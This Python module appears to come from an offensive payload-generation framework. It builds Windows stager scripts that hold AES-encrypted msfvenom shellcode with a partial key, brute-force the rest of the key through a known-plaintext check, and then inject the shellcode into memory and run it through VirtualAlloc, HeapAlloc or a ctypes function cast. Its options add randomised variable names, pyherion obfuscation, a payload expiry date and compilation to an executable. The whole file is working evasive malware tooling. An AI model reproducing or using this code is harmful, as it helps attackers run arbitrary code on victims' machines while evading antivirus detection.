"""

This payload constains encrypted shellcode, but not key in the file.  The script
brute forces itself to find the key via a known-plaintext attack, decrypts the 
shellcode, and then executes it.


Based off of CodeKoala which can be seen here:
http://www.codekoala.com/blog/2009/aes-encryption-python-using-pycrypto/
Looks like Dave Kennedy also used this code in SET
https://github.com/trustedsec/social-engineer-toolkit/blob/master/src/core/setcore.py.


module by @christruncer

"""


from datetime import date
from datetime import timedelta

from modules.common import shellcode
from modules.common import helpers
from modules.common import encryption


class Payload:
    
    def __init__(self):
        # required options
        self.description = "AES Encrypted shellcode is decrypted at runtime with key in file, injected into memory, and executed"
        self.language = "python"
        self.extension = "py"
        self.rating = "Excellent"
        
        self.shellcode = shellcode.Shellcode()
        
        # options we require user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
                                 "use_pyherion" : ["N", "Use the pyherion encrypter"],
                                 "inject_method" : ["Virtual", "Virtual, Void, Heap"],
                                 "expire_payload" : ["X", "Optional: Payloads expire after \"X\" days"]}
        
        
    def generate(self):
        if self.required_options["inject_method"][0].lower() == "virtual":
            if self.required_options["expire_payload"][0].lower() == "x":
                
                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()
        
                # Generate Random Variable Names
                ShellcodeVariableName = helpers.randomString()
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                RandDecodeAES = helpers.randomString()
                RandCipherObject = helpers.randomString()
                RandDecodedShellcode = helpers.randomString()
                RandShellCode = helpers.randomString()
                RandPadding = helpers.randomString()
                known_plaintext_string = helpers.randomString()
                plaintext_string_variable = helpers.randomString()
                key_guess = helpers.randomString()
                secret_key = helpers.randomString()
                small_constrained_key_variable = helpers.randomString()
        
                # encrypt the shellcode and grab the randomized key
                (EncodedShellcode, partial_key, secret) = encryption.constrainedAES(Shellcode)

                # Use the secret we received earlier to encrypt our known plaintext string
                encrypted_plaintext_string = encryption.knownPlaintext(secret, known_plaintext_string)
        
                # Create Payload code
                PayloadCode = 'import ctypes\n'
                PayloadCode += 'from Crypto.Cipher import AES\n'
                PayloadCode += 'import base64\n'
                PayloadCode += 'import os\n'
                PayloadCode += small_constrained_key_variable + ' = \'' + partial_key + '\'\n'
                PayloadCode += RandPadding + ' = \'{\'\n'
                PayloadCode += RandDecodeAES + ' = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(' + RandPadding + ')\n'
                PayloadCode += 'for ' + key_guess + ' in range(100000, 1000000):\n'
                PayloadCode += '\t' + secret_key + " = " + small_constrained_key_variable + ' + str(' + key_guess + ')\n'
                PayloadCode += '\t' + RandCipherObject + ' = AES.new(' + secret_key + ')\n'
                PayloadCode += '\t' + plaintext_string_variable + ' = ' + RandDecodeAES + '(' + RandCipherObject + ', \'' + encrypted_plaintext_string + '\')\n'
                PayloadCode += '\tif ' + plaintext_string_variable + ' == \'' + known_plaintext_string + '\':\n'
                PayloadCode += '\t\t' + RandDecodedShellcode + ' = ' + RandDecodeAES + '(' + RandCipherObject + ', \'' + EncodedShellcode + '\')\n'
                PayloadCode += '\t\t' + RandShellCode + ' = bytearray(' + RandDecodedShellcode + '.decode("string_escape"))\n'
                PayloadCode += '\t\t' + RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(' + RandShellCode + ')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n'
                PayloadCode += '\t\t' + RandBuf + ' = (ctypes.c_char * len(' + RandShellCode + ')).from_buffer(' + RandShellCode + ')\n'
                PayloadCode += '\t\tctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + RandShellCode + ')))\n'
                PayloadCode += '\t\t' + RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
                PayloadCode += '\t\tctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'
        
                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode

            else:

                # Get our current date and add number of days to the date
                todaysdate = date.today()
                expiredate = str(todaysdate + timedelta(days=int(self.required_options["expire_payload"][0])))

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()
        
                # Generate Random Variable Names
                ShellcodeVariableName = helpers.randomString()
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                RandDecodeAES = helpers.randomString()
                RandCipherObject = helpers.randomString()
                RandDecodedShellcode = helpers.randomString()
                RandShellCode = helpers.randomString()
                RandPadding = helpers.randomString()
                RandToday = helpers.randomString()
                RandExpire = helpers.randomString()
                known_plaintext_string = helpers.randomString()
                plaintext_string_variable = helpers.randomString()
                key_guess = helpers.randomString()
                secret_key = helpers.randomString()
                small_constrained_key_variable = helpers.randomString()
        
                # encrypt the shellcode and grab the randomized key
                (EncodedShellcode, partial_key, secret) = encryption.constrainedAES(Shellcode)

                # Use the secret we received earlier to encrypt our known plaintext string
                encrypted_plaintext_string = encryption.knownPlaintext(secret, known_plaintext_string)
        
                # Create Payload code
                PayloadCode = 'import ctypes\n'
                PayloadCode += 'from Crypto.Cipher import AES\n'
                PayloadCode += 'import base64\n'
                PayloadCode += 'import os\n'
                PayloadCode += 'from datetime import datetime\n'
                PayloadCode += 'from datetime import date\n\n'
                PayloadCode += RandToday + ' = datetime.now()\n'
                PayloadCode += RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
                PayloadCode += 'if ' + RandToday + ' < ' + RandExpire + ':\n'
                PayloadCode += '\t' + small_constrained_key_variable + ' = \'' + partial_key + '\'\n'
                PayloadCode += '\t' + RandPadding + ' = \'{\'\n'
                PayloadCode += '\t' + RandDecodeAES + ' = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(' + RandPadding + ')\n'
                PayloadCode += '\tfor ' + key_guess + ' in range(100000, 1000000):\n'
                PayloadCode += '\t\t' + secret_key + " = " + small_constrained_key_variable + ' + str(' + key_guess + ')\n'
                PayloadCode += '\t\t' + RandCipherObject + ' = AES.new(' + secret_key + ')\n'
                PayloadCode += '\t\t' + plaintext_string_variable + ' = ' + RandDecodeAES + '(' + RandCipherObject + ', \'' + encrypted_plaintext_string + '\')\n'
                PayloadCode += '\t\tif ' + plaintext_string_variable + ' == \'' + known_plaintext_string + '\':\n'
                PayloadCode += '\t\t\t' + RandDecodedShellcode + ' = ' + RandDecodeAES + '(' + RandCipherObject + ', \'' + EncodedShellcode + '\')\n'
                PayloadCode += '\t\t\t' + RandShellCode + ' = bytearray(' + RandDecodedShellcode + '.decode("string_escape"))\n'
                PayloadCode += '\t\t\t' + RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(' + RandShellCode + ')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n'
                PayloadCode += '\t\t\t' + RandBuf + ' = (ctypes.c_char * len(' + RandShellCode + ')).from_buffer(' + RandShellCode + ')\n'
                PayloadCode += '\t\t\tctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + RandShellCode + ')))\n'
                PayloadCode += '\t\t\t' + RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
                PayloadCode += '\t\t\tctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'
        
                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode

        if self.required_options["inject_method"][0].lower() == "heap":
            if self.required_options["expire_payload"][0].lower() == "x":
                
                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()
        
                # Generate Random Variable Names
                ShellcodeVariableName = helpers.randomString()
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                RandDecodeAES = helpers.randomString()
                RandCipherObject = helpers.randomString()
                RandDecodedShellcode = helpers.randomString()
                RandShellCode = helpers.randomString()
                RandPadding = helpers.randomString()
                known_plaintext_string = helpers.randomString()
                plaintext_string_variable = helpers.randomString()
                key_guess = helpers.randomString()
                secret_key = helpers.randomString()
                small_constrained_key_variable = helpers.randomString()
                HeapVar = helpers.randomString()
        
                # encrypt the shellcode and grab the randomized key
                (EncodedShellcode, partial_key, secret) = encryption.constrainedAES(Shellcode)

                # Use the secret we received earlier to encrypt our known plaintext string
                encrypted_plaintext_string = encryption.knownPlaintext(secret, known_plaintext_string)
        
                # Create Payload code
                PayloadCode = 'import ctypes\n'
                PayloadCode += 'from Crypto.Cipher import AES\n'
                PayloadCode += 'import base64\n'
                PayloadCode += 'import os\n'
                PayloadCode += small_constrained_key_variable + ' = \'' + partial_key + '\'\n'
                PayloadCode += RandPadding + ' = \'{\'\n'
                PayloadCode += RandDecodeAES + ' = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(' + RandPadding + ')\n'
                PayloadCode += 'for ' + key_guess + ' in range(100000, 1000000):\n'
                PayloadCode += '\t' + secret_key + " = " + small_constrained_key_variable + ' + str(' + key_guess + ')\n'
                PayloadCode += '\t' + RandCipherObject + ' = AES.new(' + secret_key + ')\n'
                PayloadCode += '\t' + plaintext_string_variable + ' = ' + RandDecodeAES + '(' + RandCipherObject + ', \'' + encrypted_plaintext_string + '\')\n'
                PayloadCode += '\tif ' + plaintext_string_variable + ' == \'' + known_plaintext_string + '\':\n'
                PayloadCode += '\t\t' + RandDecodedShellcode + ' = ' + RandDecodeAES + '(' + RandCipherObject + ', \'' + EncodedShellcode + '\')\n'
                PayloadCode += '\t\t' + RandShellCode + ' = bytearray(' + RandDecodedShellcode + '.decode("string_escape"))\n'
                PayloadCode += '\t\t' + HeapVar + ' = ctypes.windll.kernel32.HeapCreate(ctypes.c_int(0x00040000),ctypes.c_int(len(' + RandShellCode + ') * 2),ctypes.c_int(0))\n'
                PayloadCode += '\t\t' + RandPtr + ' = ctypes.windll.kernel32.HeapAlloc(ctypes.c_int(' + HeapVar + '),ctypes.c_int(0x00000008),ctypes.c_int(len( ' + RandShellCode + ')))\n'
                PayloadCode += '\t\t' + RandBuf + ' = (ctypes.c_char * len(' + RandShellCode + ')).from_buffer(' + RandShellCode + ')\n'
                PayloadCode += '\t\tctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + RandShellCode + ')))\n'
                PayloadCode += '\t\t' + RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
                PayloadCode += '\t\tctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'
        
                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode

            else:

                # Get our current date and add number of days to the date
                todaysdate = date.today()
                expiredate = str(todaysdate + timedelta(days=int(self.required_options["expire_payload"][0])))

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()
        
                # Generate Random Variable Names
                ShellcodeVariableName = helpers.randomString()
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                RandDecodeAES = helpers.randomString()
                RandCipherObject = helpers.randomString()
                RandDecodedShellcode = helpers.randomString()
                RandShellCode = helpers.randomString()
                RandPadding = helpers.randomString()
                RandToday = helpers.randomString()
                RandExpire = helpers.randomString()
                known_plaintext_string = helpers.randomString()
                plaintext_string_variable = helpers.randomString()
                key_guess = helpers.randomString()
                secret_key = helpers.randomString()
                small_constrained_key_variable = helpers.randomString()
                HeapVar = helpers.randomString()
        
                # encrypt the shellcode and grab the randomized key
                (EncodedShellcode, partial_key, secret) = encryption.constrainedAES(Shellcode)

                # Use the secret we received earlier to encrypt our known plaintext string
                encrypted_plaintext_string = encryption.knownPlaintext(secret, known_plaintext_string)
        
                # Create Payload code
                PayloadCode = 'import ctypes\n'
                PayloadCode += 'from Crypto.Cipher import AES\n'
                PayloadCode += 'import base64\n'
                PayloadCode += 'import os\n'
                PayloadCode += 'from datetime import datetime\n'
                PayloadCode += 'from datetime import date\n\n'
                PayloadCode += RandToday + ' = datetime.now()\n'
                PayloadCode += RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
                PayloadCode += 'if ' + RandToday + ' < ' + RandExpire + ':\n'
                PayloadCode += '\t' + small_constrained_key_variable + ' = \'' + partial_key + '\'\n'
                PayloadCode += '\t' + RandPadding + ' = \'{\'\n'
                PayloadCode += '\t' + RandDecodeAES + ' = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(' + RandPadding + ')\n'
                PayloadCode += '\tfor ' + key_guess + ' in range(100000, 1000000):\n'
                PayloadCode += '\t\t' + secret_key + " = " + small_constrained_key_variable + ' + str(' + key_guess + ')\n'
                PayloadCode += '\t\t' + RandCipherObject + ' = AES.new(' + secret_key + ')\n'
                PayloadCode += '\t\t' + plaintext_string_variable + ' = ' + RandDecodeAES + '(' + RandCipherObject + ', \'' + encrypted_plaintext_string + '\')\n'
                PayloadCode += '\t\tif ' + plaintext_string_variable + ' == \'' + known_plaintext_string + '\':\n'
                PayloadCode += '\t\t\t' + RandDecodedShellcode + ' = ' + RandDecodeAES + '(' + RandCipherObject + ', \'' + EncodedShellcode + '\')\n'
                PayloadCode += '\t\t\t' + RandShellCode + ' = bytearray(' + RandDecodedShellcode + '.decode("string_escape"))\n'
                PayloadCode += '\t\t\t' + HeapVar + ' = ctypes.windll.kernel32.HeapCreate(ctypes.c_int(0x00040000),ctypes.c_int(len(' + RandShellCode + ') * 2),ctypes.c_int(0))\n'
                PayloadCode += '\t\t\t' + RandPtr + ' = ctypes.windll.kernel32.HeapAlloc(ctypes.c_int(' + HeapVar + '),ctypes.c_int(0x00000008),ctypes.c_int(len( ' + RandShellCode + ')))\n'
                PayloadCode += '\t\t\t' + RandBuf + ' = (ctypes.c_char * len(' + RandShellCode + ')).from_buffer(' + RandShellCode + ')\n'
                PayloadCode += '\t\t\tctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + RandShellCode + ')))\n'
                PayloadCode += '\t\t\t' + RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
                PayloadCode += '\t\t\tctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'
        
                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode


        else:
            if self.required_options["expire_payload"][0].lower() == "x":

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()
        
                # Generate Random Variable Names
                ShellcodeVariableName = helpers.randomString()
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                RandDecodeAES = helpers.randomString()
                RandCipherObject = helpers.randomString()
                RandDecodedShellcode = helpers.randomString()
                RandShellCode = helpers.randomString()
                RandPadding = helpers.randomString()
                RandShellcode = helpers.randomString()
                RandReverseShell = helpers.randomString()
                RandMemoryShell = helpers.randomString()
                known_plaintext_string = helpers.randomString()
                plaintext_string_variable = helpers.randomString()
                key_guess = helpers.randomString()
                secret_key = helpers.randomString()
                small_constrained_key_variable = helpers.randomString()
        
                # encrypt the shellcode and grab the randomized key
                (EncodedShellcode, partial_key, secret) = encryption.constrainedAES(Shellcode)

                # Use the secret we received earlier to encrypt our known plaintext string
                encrypted_plaintext_string = encryption.knownPlaintext(secret, known_plaintext_string)

                # Create Payload code
                PayloadCode = 'from ctypes import *\n'
                PayloadCode += 'from Crypto.Cipher import AES\n'
                PayloadCode += 'import base64\n'
                PayloadCode += 'import os\n'
                PayloadCode += small_constrained_key_variable + ' = \'' + partial_key + '\'\n'
                PayloadCode += RandPadding + ' = \'{\'\n'
                PayloadCode += RandDecodeAES + ' = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(' + RandPadding + ')\n'
                PayloadCode += 'for ' + key_guess + ' in range(100000, 1000000):\n'
                PayloadCode += '\t' + secret_key + " = " + small_constrained_key_variable + ' + str(' + key_guess + ')\n'
                PayloadCode += '\t' + RandCipherObject + ' = AES.new(' + secret_key + ')\n'
                PayloadCode += '\t' + plaintext_string_variable + ' = ' + RandDecodeAES + '(' + RandCipherObject + ', \'' + encrypted_plaintext_string + '\')\n'
                PayloadCode += '\tif ' + plaintext_string_variable + ' == \'' + known_plaintext_string + '\':\n'
                PayloadCode += '\t\t' + RandDecodedShellcode + ' = ' + RandDecodeAES + '(' + RandCipherObject + ', \'' + EncodedShellcode + '\')\n'
                PayloadCode += '\t\t' + ShellcodeVariableName + ' = ' + RandDecodedShellcode + '.decode("string_escape")\n'
                PayloadCode += '\t\t' + RandMemoryShell + ' = create_string_buffer(' + ShellcodeVariableName + ', len(' + ShellcodeVariableName + '))\n'
                PayloadCode += '\t\t' + RandShellcode + ' = cast(' + RandMemoryShell + ', CFUNCTYPE(c_void_p))\n'
                PayloadCode += '\t\t' + RandShellcode + '()'
    
                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode

            else:
                # Get our current date and add number of days to the date
                todaysdate = date.today()
                expiredate = str(todaysdate + timedelta(days=int(self.required_options["expire_payload"][0])))

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()
        
                # Generate Random Variable Names
                ShellcodeVariableName = helpers.randomString()
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                RandDecodeAES = helpers.randomString()
                RandCipherObject = helpers.randomString()
                RandDecodedShellcode = helpers.randomString()
                RandShellCode = helpers.randomString()
                RandPadding = helpers.randomString()
                RandShellcode = helpers.randomString()
                RandReverseShell = helpers.randomString()
                RandMemoryShell = helpers.randomString()
                RandToday = helpers.randomString()
                RandExpire = helpers.randomString()
                known_plaintext_string = helpers.randomString()
                plaintext_string_variable = helpers.randomString()
                key_guess = helpers.randomString()
                secret_key = helpers.randomString()
                small_constrained_key_variable = helpers.randomString()
        
                # encrypt the shellcode and grab the randomized key
                (EncodedShellcode, partial_key, secret) = encryption.constrainedAES(Shellcode)

                # Use the secret we received earlier to encrypt our known plaintext string
                encrypted_plaintext_string = encryption.knownPlaintext(secret, known_plaintext_string)

                # Create Payload code
                PayloadCode = 'from ctypes import *\n'
                PayloadCode += 'from Crypto.Cipher import AES\n'
                PayloadCode += 'import base64\n'
                PayloadCode += 'import os\n'
                PayloadCode += 'from datetime import datetime\n'
                PayloadCode += 'from datetime import date\n\n'
                PayloadCode += RandToday + ' = datetime.now()\n'
                PayloadCode += RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
                PayloadCode += 'if ' + RandToday + ' < ' + RandExpire + ':\n'
                PayloadCode += '\t' + small_constrained_key_variable + ' = \'' + partial_key + '\'\n'
                PayloadCode += '\t' + RandPadding + ' = \'{\'\n'
                PayloadCode += '\t' + RandDecodeAES + ' = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(' + RandPadding + ')\n'
                PayloadCode += '\tfor ' + key_guess + ' in range(100000, 1000000):\n'
                PayloadCode += '\t\t' + secret_key + " = " + small_constrained_key_variable + ' + str(' + key_guess + ')\n'
                PayloadCode += '\t\t' + RandCipherObject + ' = AES.new(' + secret_key + ')\n'
                PayloadCode += '\t\t' + plaintext_string_variable + ' = ' + RandDecodeAES + '(' + RandCipherObject + ', \'' + encrypted_plaintext_string + '\')\n'
                PayloadCode += '\t\tif ' + plaintext_string_variable + ' == \'' + known_plaintext_string + '\':\n'
                PayloadCode += '\t\t\t' + RandDecodedShellcode + ' = ' + RandDecodeAES + '(' + RandCipherObject + ', \'' + EncodedShellcode + '\')\n'
                PayloadCode += '\t\t\t' + ShellcodeVariableName + ' = ' + RandDecodedShellcode + '.decode("string_escape")\n'
                PayloadCode += '\t\t\t' + RandMemoryShell + ' = create_string_buffer(' + ShellcodeVariableName + ', len(' + ShellcodeVariableName + '))\n'
                PayloadCode += '\t\t\t' + RandShellcode + ' = cast(' + RandMemoryShell + ', CFUNCTYPE(c_void_p))\n'
                PayloadCode += '\t\t\t' + RandShellcode + '()'
    
                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode

